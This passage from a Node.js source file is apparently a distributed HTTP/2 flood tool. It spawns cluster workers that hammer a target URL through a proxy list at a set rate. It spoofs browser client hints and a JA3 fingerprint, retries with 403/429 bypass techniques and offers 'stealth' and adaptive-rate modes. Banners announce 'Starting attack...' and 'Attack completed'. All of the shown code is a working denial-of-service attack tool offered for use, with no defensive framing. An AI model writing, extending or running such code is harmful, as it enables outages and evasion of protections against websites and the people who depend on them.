                    headers["sec-ch-ua"] = `"Chromium";v="${Math.floor(Math.random() * 20) + 100}", "Google Chrome";v="${Math.floor(Math.random() * 20) + 100}"`;
                    headers["sec-ch-ua-mobile"] = "?0";
                    headers["sec-ch-ua-platform"] = "Windows";
                }
            ];

            socket.setKeepAlive(true, 100000);
            const tlsSocket = createTLSSocket(parsed, socket);

            tlsSocket.on('secureConnect', async () => {
                headers["ja3"] = generateJA3Fingerprint();
            });

            tlsSocket.on('error', () => {});

            const client = http2.connect(parsed.href, {
                createConnection: () => tlsSocket,
                initialWindowSize: 33554432,
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 100,
                    initialWindowSize: 33554432,
                    maxHeaderListSize: 262144,
                    enablePush: false,
                },
            }, async () => {
                function request(retryCount = 0) {
                    if (client.destroyed) return;

                    if (retryCount > 0 && retryCount <= bypass403Techniques.length) {
                        bypass403Techniques[retryCount - 1]();
                    }

                    const req = client.request(headers);

                    req.on("response", (res) => {
                        const status = res[':status'];

                        if (!statusStats[status]) statusStats[status] = 0;
                        statusStats[status]++;

                        if ((status === 403 || status === 429) && options.ratelimit) {
                            ratelimit.push({ 
                                proxy: proxy, 
                                timestamp: Date.now(),
                                status: status
                            });

                            if (!statusStats['BLOCK']) statusStats['BLOCK']++;

                            if (retryCount < bypass403Techniques.length) {
                                setTimeout(() => request(retryCount + 1), Math.pow(2, retryCount) * 1000);
                            }

                            client.destroy();
                            return;
                        }

                        if (res['set-cookie']) {
                            cookieJar.setCookie(res['set-cookie'].join('; '), parsed.host);
                        }

                        if (options.redirect && (status >= 300 && status < 400) && res['location']) {
                            const newLocation = url.resolve(parsed.href, res['location']);
                            const newParsed = url.parse(newLocation);

                            headers[":path"] = newParsed.path;
                            headers[":authority"] = newParsed.host;

                            request();
                        } else {
                            req.close();
                        }

                        if (options.adaptive) {
                            if (status === 200) {
                                rate = Math.min(rate + 1, 100);
                            } else if (status >= 400) {
                                rate = Math.max(rate - 1, 1);
                            }
                        }
                    }).on('error', () => {
                        if (!statusStats['CLOSE']) statusStats['CLOSE']++;

                        if (retryCount < 3) {
                            setTimeout(() => request(retryCount + 1), Math.pow(2, retryCount) * 1000);
                        }
                    }).end();

                    requestCount++;

                    setTimeout(() => {
                        request();
                    }, 1000 / rate);
                }

                if (options.stealth) {
                    const delay = Math.random() * 1000;
                    setTimeout(() => request(), delay);
                } else {
                    request();
                }
            }).on('error', (err) => {
                if (err.code === "ERR_HTTP2_GOAWAY_SESSION" || err.code === "ECONNRESET") {
                    client.destroy();
                }
            });
        }
    }).on("error", () => {}).end();
}

if (cluster.isMaster) {
    const workers = new Map();
    process.stdin.resume();
    console.log(colors.cyan(`[+] Target    : `) + colors.red(`${target}`));
    console.log(colors.cyan(`[+] Duration  : `) + colors.yellow(`${duration}s`));
    console.log(colors.cyan(`[+] Threads   : `) + colors.green(`${threads}`));
    console.log(colors.cyan(`[+] Rate      : `) + colors.magenta(`${rate}/s`));
    console.log(colors.cyan(`[+] Proxy     : `) + colors.blue(`${proxyfile}\n`));
    console.log(colors.green(`[!] Starting attack...\n`));
    for (let i = 0; i < threads; i++) {
        const worker = cluster.fork();
        workers.set(worker.id, {
            instance: worker,
            stats: {},
            startTime: Date.now()
        });
    }

    cluster.on('message', (worker, message) => {
        const workerData = workers.get(worker.id);
        if (workerData) {
            workerData.stats = message;
        }
    });

    cluster.on('exit', (worker, code, signal) => {
        if (signal !== 'SIGTERM') {
            const newWorker = cluster.fork();
            workers.set(newWorker.id, {
                instance: newWorker,
                stats: {},
                startTime: Date.now()
            });
        }
    });

    if (options.debug) {
        setInterval(() => {
            let totalStats = {};
            for (const [workerId, workerData] of workers) {
                const stats = workerData.stats;
                Object.keys(stats).forEach(status => {
                    totalStats[status] = (totalStats[status] || 0) + stats[status];
                });
            }
            console.log(new Date().toLocaleString(), totalStats);
        }, 1000);
    }

    setTimeout(() => {
        console.log('\n[!] Attack completed');
        process.exit(0);
    }, duration * 1000);

} else {
    loadProxies();
    
    const attackInterval = setInterval(() => {
        for (let i = 0; i < rate; i++) {
            attack();
        }
    }, 1000);

    if (options.debug) {
        setInterval(() => {
            if (process.connected) {
                process.send(statusStats);
            }
        }, 250);
    }

    setTimeout(() => {
        clearInterval(attackInterval);
        process.exit(0);
    }, duration * 1000);
}
